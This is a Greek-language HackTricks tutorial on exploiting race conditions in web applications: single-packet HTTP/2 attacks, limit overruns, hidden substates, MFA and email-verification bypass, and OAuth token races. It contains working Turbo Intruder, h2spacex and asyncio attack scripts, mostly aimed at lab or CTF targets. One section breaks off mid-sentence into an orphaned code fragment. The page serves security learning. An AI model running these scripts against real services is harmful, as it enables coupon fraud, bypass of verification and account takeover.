# Ανταγωνιστική Κατάσταση

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

{% hint style="warning" %}
Για να αποκτήσετε μια βαθιά κατανόηση αυτής της τεχνικής, ελέγξτε την αρχική αναφορά στο [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Ενίσχυση Επιθέσεων Ανταγωνιστικής Κατάστασης

Ο κύριος εμπόδιο στο εκμεταλλευτικό των ανταγωνιστικών καταστάσεων είναι να διασφαλιστεί ότι πολλαπλά αιτήματα χειρίζονται ταυτόχρονα, με **πολύ μικρή διαφορά στους χρόνους επεξεργασίας τους - ιδανικά λιγότερο από 1ms**.

Εδώ μπορείτε να βρείτε μερικές τεχνικές για τον Συγχρονισμό των Αιτημάτων:

#### Επίθεση Ενός Πακέτου HTTP/2 έναντι Συγχρονισμού Τελευταίου Byte HTTP/1.1

* **HTTP/2**: Υποστηρίζει την αποστολή δύο αιτημάτων μέσω μιας μόνο σύνδεσης TCP, μειώνοντας τον αντίκτυπο της διακύμανσης του δικτύου. Ωστόσο, λόγω ποικίλιας στην πλευρά του διακομιστή, δύο αιτήματα ενδέχεται να μην επαρκούν για μια συνεπή εκμετάλλευση ανταγωνιστικής κατάστασης.
* **HTTP/1.1 'Συγχρονισμός Τελευταίου Byte'**: Επιτρέπει την προαποστολή των περισσότερων τμημάτων 20-30 αιτημάτων, κρατώντας ένα μικρό κομμάτι, το οποίο στη συνέχεια στέλνεται μαζί, επιτυγχάνοντας την ταυτόχρονη άφιξη στο διακομιστή.

Η **Προετοιμασία για τον Συγχρονισμό του Τελευταίου Byte** περιλαμβάνει:

1. Αποστολή κεφαλίδων και δεδομένων σώματος χωρίς το τελευταίο byte χωρίς να τερματίζεται το ρεύμα.
2. Παύση για 100ms μετά την αρχική αποστολή.
3. Απενεργοποίηση του TCP_NODELAY για να χρησιμοποιηθεί ο αλγόριθμος του Nagle για την ομαδοποίηση των τελικών πλαισίων.
4. Αποστολή ping για να ζεστάνει η σύνδεση.

Η επόμενη αποστολή των κρατούμενων πλαισίων θα πρέπει να οδηγήσει στην άφιξή τους σε ένα μόνο πακέτο, το οποίο είναι επαληθεύσιμο μέσω του Wireshark. Αυτή η μέθοδος δεν ισχύει για στατικά αρχεία, τα οποία συνήθως δεν συμμετέχουν σε επιθέσεις RC.

### Προσαρμογή στην Αρχιτεκτονική του Διακομιστή

Η κατανόηση της αρχιτεκτονικής του στόχου είναι κρίσιμη. Οι διακομιστές μπορεί να δρομολογούν αιτήματα διαφορετικά, επηρεάζοντας το χρονισμό. Η προεκτεταμένη προθερμανση της σύνδεσης από την πλευρά του διακομιστή, μέσω ασήμαντων αιτημάτων, μπορεί να κανονικοποιήσει το χρονισμό των αιτημάτων.

#### Χειρισμός Κλειδώματος Βάσεων Δεδομένων βάσει Συνεδρίας

Τα πλαίσια όπως ο χειριστής συνεδριών του PHP σειριοποιούν τα αιτήματα ανά συνεδρία, πιθανώς αποκρύπτοντας ευπαθείς σημεία. Η χρήση διαφορετικών διακριτικών συνεδρίας για κάθε αίτημα μπορεί να παρακάμψει αυτό το ζήτημα.

#### Ξεπερνώντας Όρια Ρυθμού ή Πόρων

Αν η προθέρμανση της σύνδεσης είναι αναποτελεσματική, η πρόκληση εσκεμμένως καθυστερήσεων ρυθμού ή περιορισμών πόρων των διακομιστών ιστού μέσω μιας πλημμύρας ψεύτικων αιτημάτων ενδέχεται να διευκολύνει την επίθεση με ένα μόνο πακέτο, προκαλώντας μια καθυστέρηση στην πλευρά του διακομιστή που ευνοεί τις ανταγωνιστικές καταστάσεις.

## Παραδείγματα Επίθεσης

* **Tubo Intruder - Επίθεση με μονό πακέτο HTTP2 (1 σημείο άκρης)**: Μπορείτε να στείλετε το αίτημα στο **Turbo intruder** (`Επεκτάσεις` -> `Turbo Intruder` -> `Αποστολή στο Turbo Intruder`), μπορείτε να αλλάξετε στο αίτημα την τιμή που θέλετε να δοκιμάσετε με βία **`%s`** όπως στο `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` και στη συνέχεια να επιλέξετε το **`παραδείγματα/race-single-packer-attack.py`** από την αναπτυσσόμενη λίστα:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Αν πρόκειται να **στείλετε διαφορετικές τιμές**, μπορείτε να τροποποιήσετε τον κώδικα με αυτόν που χρησιμοποιεί μια λίστα λέξεων από το πρόχειρο:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Αν η ιστοσελίδα δεν υποστηρίζει HTTP2 (μόνο HTTP1.1), χρησιμοποιήστε `Engine.THREADED` ή `Engine.BURP` αντί για `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - Επίθεση με ενιαίο πακέτο HTTP2 (Πολλαπλά σημεία πρόσβασης)**: Σε περίπτωση που χρειάζεστε να στείλετε ένα αίτημα σε ένα σημείο πρόσβασης και στη συνέχεια πολλαπλά σε άλλα σημεία πρόσβασης για να ενεργοποιήσετε το RCE, μπορείτε να τροποποιήσετε το σενάριο `race-single-packet-attack.py` με κάτι παρόμοιο:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Είναι επίσης διαθέσιμο στο **Repeater** μέσω της νέας επιλογής '**Αποστολή ομάδας παράλληλα**' στο Burp Suite.
* Για το **limit-overrun** θα μπορούσατε απλά να προσθέσετε το **ίδιο αίτημα 50 φορές** στην ομάδα.
* Για το **connection warming**, θα μπορούσατε να **προσθέσετε** στην **αρχή** της **ομάδας** μερικά **αιτήματα** προς κάποιο μη στατικό μέρος του διακομιστή ιστού.
* Για την **καθυστέρηση** της διαδικασίας **μεταξύ** της επεξεργασίας **ενός αιτήματος και ενός άλλου** σε 2 υποκαταστάσεις, θα μπορούσατε να **προσθέσετε επιπλέον αιτήματα μεταξύ** των δύο αιτημάτων.
* Για ένα **πολυ-τελικό σημείο** RC θα μπορούσατε να ξεκινήσετε την αποστολή του **αιτήματος** που **πηγαίνει στην κρυφή κατάσταση** και στη συνέχεια **50 αιτήματα** αμέσως μετά που **εκμεταλλεύονται την κρυφή κατάσταση**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Αυτοματοποιημένο σενάριο python**: Ο στόχος αυτού του σεναρίου είναι να αλλάξει το email ενός χρήστη ενώ συνεχώς επαληθεύει μέχρι να φτάσει το τεκμήριο επαλήθευσης του νέου email στο προηγούμενο email (αυτό συμβαίνει επειδή στον κώδικα είδαμε ένα RC όπου ήταν δυνατή η τροποποίηση ενός email αλλά η επαλήθευση στάλθηκε στο παλιό επειδή η μεταβλητή που υποδεικνύει το email είχε ήδη γεμίσει με το πρώτο).\
Όταν βρεθεί η λέξη "objetivo" στα ληφθέντα emails γνωρίζουμε ότι λάβαμε το τεκμήριο επαλήθευσης του αλλαγμένου email και τερματίζουμε την επίθεση.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Ακατέργαστο BF

Πριν από την προηγούμενη έρευνα, αυτά ήταν μερικά φορτία που χρησιμοποιήθηκαν που απλώς προσπάθησαν να στείλουν τα πακέτα τόσο γρήγορα ώστε να προκαλέσουν έναν RC.

* **Repeater:** Ελέγξτε τα παραδείγματα από την προηγούμενη ενότητα.
* **Intruder**: Στείλτε το **αίτημα** στο **Intruder**, ορίστε τον **αριθμό των νημάτων** σε **30** μέσα στο μενού **Επιλογές** και, επιλέξτε ως φορτίο **Κενά φορτία** και δημιουργήστε **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Πυθών - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Μεθοδολογία RC**

### Υπέρβαση Ορίου / TOCTOU

Αυτός είναι ο πιο βασικός τύπος race condition όπου **ευπάθειες** που **εμφανίζονται** σε σημεία που **περιορίζουν τον αριθμό των φορών που μπορείτε να εκτελέσετε μια ενέργεια**. Όπως η χρήση του ίδιου κωδικού έκπτωσης σε ένα κατάστημα στο διαδίκτυο πολλές φορές. Ένα πολύ εύκολο παράδειγμα μπορεί να βρεθεί σε [**αυτήν την αναφορά**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ή σε [**αυτό το σφάλμα**](https://hackerone.com/reports/759247)**.**

Υπάρχουν πολλές παραλλαγές αυτού του είδους επίθεσης, συμπεριλαμβανομένων:

* Εξαργύρωση ενός κουπονιού δώρου πολλές φορές
* Αξιολόγηση ενός προϊόντος πολλές φορές
* Ανάληψη ή μεταφορά μετρητών υπέρ του υπολοίπου του λογαριασμού σας
* Επαναχρησιμοποίηση μιας μόνο λύσης CAPTCHA
* Παράκαμψη ενός ορίου ρυθμού αντίστασης σε βίαιες επιθέσεις

### **Κρυφές υποκαταστάσεις**

Η εκμετάλλευση πολύπλοκων race conditions συχνά περιλαμβάνει την εκμετάλλευση σύντομων ευκαιριών για αλληλεπίδραση με κρυφές ή **μη προσδιορισμένες υποκαταστάσεις μηχανής**. Ακολουθήστε αυτά τα βήματα:

1. **Αναγνωρίστε Πιθανές Κρυφές Υποκαταστάσεις**
* Ξεκινήστε εντοπίζοντας σημεία που τροποποιούν ή αλληλεπιδρούν με κρίσιμα δεδομένα, όπως προφίλ χρηστών ή διαδικασίες επαναφοράς κωδικού πρόσβασης. Εστιάστε σε:
* **Αποθήκευση**: Διαθέσιμα σημεία που χειρίζονται δεδομένα μόνιμα στον διακομιστή αντί για αυτά που χειρίζονται δεδομένα στον πελάτη.
* **Ενέργεια**: Αναζητήστε λειτουργίες που τροποποιούν υπάρχοντα δεδομένα, τα οποία είναι πιθανότερο να δημιουργήσουν εκμεταλλεύσιμες συνθήκες σε σύγκριση με αυτές που προσθέτουν νέα δεδομένα.
* **Κλειδώματα**: Επιτυχείς επιθέσεις συνήθως περιλαμβάνουν λειτουργίες που βασίζονται στο ίδιο αναγνωριστικό, π.χ., όνομα χρήστη ή διακριτικό επαναφοράς.
2. **Πραγματοποιήστε Αρχική Εξερεύνηση**
* Δοκιμάστε τα εντοπισμένα σημεία με επιθέσεις race condition, παρατηρώντας για οποιεσδήποτε αποκλίσεις από τα αναμενόμενα αποτελέσματα. Απροσδόκητες απαντήσεις ή αλλαγές στη συμπεριφορά της εφαρμογής μπορούν να υποδείξουν μια ευπάθεια.
3. **Αποδείξτε την Ευπάθεια**
* Περιορίστε την επίθεση στον ελάχιστο αριθμό αιτημάτων που απαιτούνται για να εκμεταλλευτείτε την ευπάθεια, συνήθως μόνο δύο. Αυτό το βήμα μπορεί να απαιτήσει πολλαπλές προσπάθειες ή αυτοματοποίηση λόγω του ακριβούς χρονισμού που απαιτείται.

### Επιθέσεις Ευαίσθητες στον Χρόνο

Η ακρίβεια στο χρονισμό των αιτημάτων μπορεί να αποκαλύψει ευπάθειες, ειδικά όταν χρησιμοποιούνται προβλέψιμες μεθόδους όπως σφραγίδες χρόνου για τα αναγνωριστικά ασφαλείας. Για παράδειγμα, η δημιουργία των σφραγίδων επαναφοράς κωδικού βασισμένη σε σφραγίδες χρόνου θα μπορούσε να επιτρέψει ταυτόσημες σφραγίδες για ταυτόχρονα αιτήματα.

**Για Εκμετάλλευση:**

* Χρησιμοποιήστε ακριβή χρονισμό, όπως μια επίθεση με ένα πακέτο, για να κάνετε ταυτόχρονα αιτήματα επαναφοράς κωδικού. Οι ταυτόσημες σφραγίδες υποδηλώνουν μια ευπάθεια.

**Παράδειγμα:**

* Ζητήστε δύο σφραγίδες επαναφοράς κωδικού ταυτόχρονα και συγκρίνετέ τις. Οι ταυτόσημες σφραγίδες υποδηλώνουν ένα ελάττωμα στη δημιουργία των σφραγίδων.

**Ελέγξτε αυτό το** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **για να δοκιμάσετε αυτό.**

## Περιπτώσεις μελέτης κρυφών υποκαταστάσεων

### Πληρωμή & προσθήκη ενός Αντικειμένου

Ελέγξτε αυτό το [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) για να δείτε πώς να **πληρώσετε** σε ένα κατάστημα και να **προσθέσετε ένα επιπλέον** αντικείμενο που **δεν θα χρειαστεί να πληρώσετε γι' αυτό**.

### Επιβεβαίωση άλλων email

Η ιδέα είναι να **επιβεβαιώσετε μια διεύθυνση email και να την αλλάξετε σε μια διαφορετική ταυτόχρονα** για να διαπιστώσετε αν η πλατφόρμα επιβεβαιώνει τη νέα που άλλαξε.

### Αλλαγή email σε 2 διευθύνσεις email βασισμένη σε Cookie

Σύμφωνα με [**αυτή την έρευνα**](https://portswigger.net/research/smashing-the-state-machine) το Gitlab ήταν ευάλωτο σε μια επίθεση λόγω race condition επειδή θα μπορούσε **να στείλει το διακριτικό επαλήθευσης email μιας διεύθυνσης email στην άλλη διεύθυνση email**.

**Ελέγξτε αυτό το** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **για να δοκιμάσετε αυτό.**

### Κρυφές καταστάσεις Βάσης Δεδομένων / Παράκαμψη Επιβεβαίωσης

Εάν **χρησιμοποιούνται 2 διαφορετικές εγγραφές** για να **προσθέσουν** **πληροφορίες** μέσα σε μια **βάση δεδομένων**, υπάρχει ένα μικρό χρονικό διάστημα όπου **μόνο η πρώτη δεδομένη έχει γραφτεί** μέσα στη βάση δεδομένων. Για παράδειγμα, κατά τη δημιουργία ενός χρήστη το **όνομα χρήστη** και ο **κωδικός πρόσβασης** μπορεί να **γραφτούν** και στη συνέχεια το **διακριτικό** για την επιβεβαίωση του νεοδημιουργημένου λογαριασμού γράφεται. Αυτό σημαίνει ότι για ένα μικρό χρονικό διάστημα το **διακριτικό για την επιβεβαίωση ενός λογαριασμού είναι κενό**.

Επομένως, **η εγγραφή ενός λογαριασμού και η αποστολή αρκετών αιτημάτων με ένα κενό διακριτικό** (`token=` ή `token[]=` ή οποιαδήποτε άλλη παραλλαγή) για να επιβεβαιώσετε αμέσως τον λογαριασμό θα μπορούσε να επιτρ
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Αιώνια διατήρηση OAuth2

Υπάρχουν πολλοί [**παροχείς OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Αυτές οι υπηρεσίες θα σας επιτρέψουν να δημιουργήσετε μια εφαρμογή και να πιστοποιήσετε χρήστες που έχει εγγράψει ο πάροχος. Για να το κάνετε αυτό, ο **πελάτης** θα πρέπει να **επιτρέψει στην εφαρμογή σας** να έχει πρόσβαση σε μερικά από τα δεδομένα τους μέσα στον **πάροχο OAuth**.\
Έτσι, μέχρι εδώ απλώς μια κοινή σύνδεση με google/linkedin/github... όπου σας ζητείται να επιτρέψετε σε μια σελίδα να αποκτήσει πρόσβαση στα δεδομένα σας.

#### Ανταγωνισμός στην `authorization_code`

Το **πρόβλημα** εμφανίζεται όταν το **αποδέχεστε** και αυτόματα στέλνει ένα **`authorization_code`** στην κακόβουλη εφαρμογή. Στη συνέχεια, αυτή η **εφαρμογή εκμεταλλεύεται έναν ανταγωνισμό στην υπηρεσία παροχής OAuth για να δημιουργήσει περισσότερα από ένα AT/RT** (_Authentication Token/Refresh Token_) από το **`authorization_code`** για το λογαριασμό σας. Βασικά, θα εκμεταλλευτεί το γεγονός ότι έχετε αποδεχτεί την εφαρμογή για να έχει πρόσβαση στα δεδομένα σας για να **δημιουργήσει πολλαπλούς λογαριασμούς**. Στη συνέχεια, αν **σταματήσετε να επιτρέπετε στην εφαρμογή να έχει πρόσβαση στα δεδομένα σας, ένα ζεύγος AT/RT θα διαγραφεί, αλλά τα υπόλοιπα θα παραμείνουν έγκυρα**.

#### Ανταγωνισμός στο `Refresh Token`

Αφού έχετε **λάβει ένα έγκυρο RT** μπορείτε να προσπαθήσετε να το **εκμεταλλευτείτε για να δημιουργήσετε πολλαπλά AT/RT** και **ακόμα κι αν ο χρήστης ακυρώσει τις άδειες** για την κακόβουλη εφαρμογή να έχει πρόσβαση στα δεδομένα του, **πολλά RT θα παραμείνουν έγκυρα**.

## **Ανταγωνισμός στα WebSockets**

Στο [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) μπορείτε να βρείτε ένα PoC σε Java για να στείλετε μηνύματα websocket **παράλληλα** για να εκμεταλλευτείτε **ανταγωνισμούς και στα Web Sockets**.

## Αναφορές

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
